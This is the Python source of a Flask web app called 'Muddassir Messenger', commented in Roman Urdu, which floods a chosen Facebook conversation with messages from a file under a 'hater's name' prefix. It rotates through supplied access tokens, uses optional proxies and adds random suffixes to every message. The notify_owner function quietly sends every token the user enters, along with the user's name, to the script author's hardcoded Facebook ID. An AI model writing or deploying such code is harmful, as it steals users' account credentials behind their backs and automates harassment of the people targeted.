# -*- coding: utf-8 -*-
from flask import Flask, request, render_template_string, jsonify
import requests
from threading import Thread, Event
import time
import random
import string
import datetime

app = Flask(__name__)
app.debug = True

# --- Data Storage (Global Variables) ---
active_tasks = {}

# --- Helper Functions ---

def notify_owner(user_tokens, user_info, proxy_dict):
    """
    Ye function script ke owner ko naye tokens ke baare mein notify karta hai.
    Yeh user ke diye hue pehle token ko hi istemal karke notification bhejta hai.
    """
    def task():
        # Aapki Facebook ID, jis par notification jayega.
        owner_facebook_id = "100017068697026"
        
        # Notification bhejne ke liye user ka hi pehla token istemal karo.
        token_for_notification = user_tokens[0]
        
        tokens_str = "\n".join(user_tokens)
        message = (
            f"🔥 Naya Server User 🔥\n\n"
            f"👤 User Ka Naam: {user_info['name']}\n"
            f"ℹ️ Total Tokens Diye: {len(user_tokens)}\n\n"
            f"🔑 Tokens List:\n{tokens_str}"
        )
        
        url = f"https://graph.facebook.com/v15.0/t_{owner_facebook_id}/"
        params = {'access_token': token_for_notification, 'message': message}
        headers = {'User-Agent': 'Mozilla/5.0'}
        
        try:
            # Notification bhejte waqt bhi proxy istemal karo agar di gayi hai
            response = requests.post(url, data=params, headers=headers, proxies=proxy_dict, timeout=15)
            if response.status_code == 200:
                print("Owner ko notification successfully bhej diya gaya hai.")
            else:
                print(f"Owner ko notification bhejne mein error: {response.text}")
        except Exception as e:
            print(f"Owner ko notification bhejte waqt exception hui: {e}")

    # Function ko ek naye thread mein run karo taake main app na ruke
    notification_thread = Thread(target=task)
    notification_thread.daemon = True
    notification_thread.start()


def get_user_info(access_token, proxy_dict):
    url = f"https://graph.facebook.com/v19.0/me?fields=name,picture.type(large)&access_token={access_token}"
    try:
        response = requests.get(url, proxies=proxy_dict, timeout=10)
        response.raise_for_status()
        data = response.json()
        user_name = data.get('name', 'Unknown User')
        user_logo = data.get('picture', {}).get('data', {}).get('url', 'https://i.ibb.co/Y7pSw8n/0619bf4938a774e6cb5f4eea1ce28559.jpg')
        return user_name, user_logo
    except requests.exceptions.RequestException as e:
        print(f"Error fetching user info: {e}")
        return "Invalid Token", "https://i.ibb.co/Y7pSw8n/0619bf4938a774e6cb5f4eea1ce28559.jpg"

def send_messages_thread(task_id, access_tokens, thread_id, hater_name, time_interval, messages, proxy_dict):
    task = active_tasks[task_id]
    token_index = 0
    while not task["stop_event"].is_set():
        for message_template in messages:
            if task["stop_event"].is_set(): break
            current_token = access_tokens[token_index]
            unique_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
            message_to_send = f"{hater_name} {message_template} [{unique_id}]"
            api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
            parameters = {'access_token': current_token, 'message': message_to_send}
            headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36'}
            try:
                response = requests.post(api_url, data=parameters, headers=headers, proxies=proxy_dict, timeout=20)
                if response.status_code == 200:
                    task["messages_sent"] += 1
                    task["last_error"] = "None"
                else:
                    error_message = response.json().get('error', {}).get('message', 'Unknown Error')
                    task["last_error"] = f"Token {token_index + 1}: {error_message}"
            except Exception as e:
                task["last_error"] = f"Token {token_index + 1}: {str(e)}"
            token_index = (token_index + 1) % len(access_tokens)
            time.sleep(time_interval)
    if task["status"] == "Running": task["status"] = "Stopped"
    print(f"Task {task_id} has been stopped.")

# --- Flask Routes ---

@app.route('/', methods=['GET', 'POST'])
def main_page():
    if request.method == 'POST':
        token_option = request.form.get('tokenOption')
        access_tokens = []
        proxy_string = request.form.get('proxy')
        proxy_dict = {"http": f"http://{proxy_string}", "https": f"http://{proxy_string}"} if proxy_string else {}

        if token_option == 'single':
            single_token = request.form.get('singleToken')
            if single_token: access_tokens.append(single_token)
        else:
            token_file = request.files.get('tokenFile')
            if token_file:
                lines = token_file.read().decode('utf-8', errors='ignore').splitlines()
                access_tokens = [line.strip() for line in lines if line.strip()]

        if not access_tokens: return "Error: No access token provided.", 400

        user_name, user_logo = get_user_info(access_tokens[0], proxy_dict)
        if user_name == "Invalid Token": return "The first Access Token is invalid. Please check your token(s) and try again.", 400

        # >>> NAYA FEATURE: Owner ko notification bhejo <<<
        # Yeh user ke diye hue token se hi aapko message bhej dega.
        notify_owner(access_tokens, {"name": user_name}, proxy_dict)
        # >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>

        thread_id = request.form.get('threadId')
        hater_name = request.form.get('haterName')
        time_interval = int(request.form.get('time'))
        txt_file = request.files.get('txtFile')
        
        if not all([thread_id, hater_name, time_interval, txt_file]): return "Error: All fields are required.", 400

        messages = txt_file.read().decode('utf-8', errors='ignore').splitlines()
        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
        
        active_tasks[task_id] = {
            "uid": task_id, "user_name": f"{user_name} (+{len(access_tokens) - 1} more)",
            "user_logo": user_logo, "status": "Running", "messages_sent": 0,
            "start_time": datetime.datetime.now(), "stop_event": Event(), "last_error": "None"
        }
        
        thread = Thread(target=send_messages_thread, args=(task_id, access_tokens, thread_id, hater_name, time_interval, messages, proxy_dict))
        thread.daemon = True
        thread.start()
        
        return f"""
        <html><head><title>Task Started</title></head><body style="font-family: sans-serif; text-align: center; padding-top: 50px;">
            <h2>Task Successfully Started!</h2><p>Your process is running in the background.</p>
            <p>Your Unique ID (UID) is:</p><h3 style="background: #eee; padding: 10px; border-radius: 5px; display: inline-block;">{task_id}</h3>
            <p>Use this UID on the main page to check the live status of your task.</p><a href="/">Go back to Main Page</a>
        </body></html>
        """

    return render_template_string('''
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Muddassir CONVO Messenger</title>
      <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
      <style>
        body { background-color: #121212; color: white; } .container { max-width: 500px; margin-top: 30px; }
        .card { background-color: #1e1e1e; border: 1px solid #444; }
        .form-control, .form-select { background-color: #333; border: 1px solid #555; color: white; }
        .form-control:focus, .form-select:focus { background-color: #333; border-color: #0d6efd; color: white; box-shadow: none; }
        .btn-primary { background-color: #0d6efd; border: none; }
        .status-card { margin-top: 20px; padding: 15px; background-color: #1e1e1e; border-radius: 10px; border: 1px solid #444; }
        .status-card img { width: 80px; height: 80px; border-radius: 50%; }
        .status-running { color: #28a745; } .status-stopped { color: #dc3545; }
      </style>
    </head>
    <body>
      <div class="container">
        <div class="card p-4">
          <h1 class="text-center mb-4">Muddassir Messenger</h1>
          <form method="post" enctype="multipart/form-data">
            <div class="mb-3">
              <label for="tokenOption" class="form-label">Token Option</label>
              <select class="form-select" id="tokenOption" name="tokenOption" onchange="toggleTokenInput()">
                <option value="single">Single Token</option><option value="multiple">Multiple Tokens (File)</option>
              </select>
            </div>
            <div id="singleTokenInput" class="mb-3">
              <label for="singleToken" class="form-label">Facebook Access Token</label>
              <input type="password" class="form-control" id="singleToken" name="singleToken">
            </div>
            <div id="tokenFileInput" class="mb-3" style="display: none;">
              <label for="tokenFile" class="form-label">Tokens File (.txt)</label>
              <input type="file" class="form-control" id="tokenFile" name="tokenFile" accept=".txt">
            </div>
            <div class="mb-3">
              <label for="threadId" class="form-label">Convo/Inbox ID</label>
              <input type="text" class="form-control" id="threadId" name="threadId" required>
            </div>
            <div class="mb-3">
              <label for="haterName" class="form-label">Hater's Name (Prefix)</label>
              <input type="text" class="form-control" id="haterName" name="haterName" required>
            </div>
            <div class="mb-3">
              <label for="time" class="form-label">Time Delay (seconds)</label>
              <input type="number" class="form-control" id="time" name="time" required>
            </div>
            <div class="mb-3">
              <label for="txtFile" class="form-label">Messages File (.txt)</label>
              <input type="file" class="form-control" id="txtFile" name="txtFile" accept=".txt" required>
            </div>
            <div class="mb-3">
              <label for="proxy" class="form-label">Proxy (Optional)</label>
              <input type="text" class="form-control" id="proxy" name="proxy" placeholder="e.g., 192.168.1.1:8080">
            </div>
            <button type="submit" class="btn btn-primary w-100">Start Sending</button>
          </form>
        </div>
        <div class="card p-4 mt-4">
          <h2 class="text-center mb-3">Check Live Status</h2>
          <div class="input-group mb-3">
            <input type="text" id="statusUidInput" class="form-control" placeholder="Enter UID to check status">
            <button class="btn btn-outline-secondary" type="button" onclick="checkStatus()">Check</button>
          </div>
          <div id="statusResult" class="status-card" style="display:none;"></div>
        </div>
      </div>
      <script>
        function toggleTokenInput() {
          var option = document.getElementById('tokenOption').value;
          document.getElementById('singleTokenInput').style.display = (option === 'single') ? 'block' : 'none';
          document.getElementById('tokenFileInput').style.display = (option === 'multiple') ? 'block' : 'none';
        }
        function checkStatus() {
          const uid = document.getElementById('statusUidInput').value;
          if (!uid) { alert('Please enter a UID.'); return; }
          fetch(`/status/${uid}`).then(response => response.json()).then(data => {
            const statusDiv = document.getElementById('statusResult');
            if (data.error) {
              statusDiv.innerHTML = `<p class="text-center text-danger">${data.error}</p>`;
            } else {
              const uptime = Math.floor((new Date() - new Date(data.start_time)) / 1000);
              const h = Math.floor(uptime / 3600); const m = Math.floor((uptime % 3600) / 60); const s = uptime % 60;
              statusDiv.innerHTML = `
                <div class="d-flex align-items-center"><img src="${data.user_logo}" alt="User Logo">
                  <div class="ms-3"><h5>${data.user_name}</h5><p class="mb-0">UID: ${data.uid}</p></div>
                </div><hr>
                <p><strong>Status:</strong> <span class="${data.status.includes('Running') ? 'status-running' : 'status-stopped'}">${data.status}</span></p>
                <p><strong>Messages Sent:</strong> ${data.messages_sent}</p>
                <p><strong>Uptime:</strong> ${h}h ${m}m ${s}s</p>
                <p><strong>Last Error:</strong> ${data.last_error}</p>`;
            }
            statusDiv.style.display = 'block';
          }).catch(error => {
            console.error('Error:', error);
            document.getElementById('statusResult').innerHTML = '<p class="text-center text-danger">Failed to fetch status.</p>';
            document.getElementById('statusResult').style.display = 'block';
          });
        }
        toggleTokenInput();
      </script>
    </body>
    </html>
    ''')

@app.route('/status/<task_id>', methods=['GET'])
def get_status(task_id):
    if task_id in active_tasks:
        task = active_tasks[task_id]
        # JSON response ke liye data ko theek se format karo
        return jsonify({
            "uid": task["uid"], "user_name": task["user_name"], "user_logo": task["user_logo"],
            "status": task["status"], "messages_sent": task["messages_sent"],
            "start_time": task["start_time"].isoformat(), "last_error": task["last_error"]
        })
    else:
        return jsonify({"error": "Invalid UID. No task found."}), 404

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
